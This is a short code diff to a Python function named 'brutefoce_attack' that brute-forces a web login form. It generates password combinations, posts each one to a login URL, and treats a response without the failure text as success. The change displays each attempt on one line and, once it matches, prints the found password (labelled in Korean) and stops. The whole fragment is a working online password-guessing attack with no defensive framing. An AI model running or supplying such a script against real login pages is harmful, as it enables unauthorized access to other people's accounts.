@@ -43,13 +43,12 @@ def brutefoce_attack():
     for password_length in range(pw_len+1):
         for password in product(pw_word, repeat=password_length):
             password =''.join(password)
-            print(password)
+            print(f'{password}', end='\r')
             login_packet = {
                 name_id : id,
                 name_pw : password,
             }
             address = requests.post(login_url, data=login_packet)
             if address.text.find(login_fail_text) == -1:
-                exit()
-    print("\n검색된 비밀번호 : " + password)
-
+                print("\n검색된 비밀번호 : " + password)
+                break
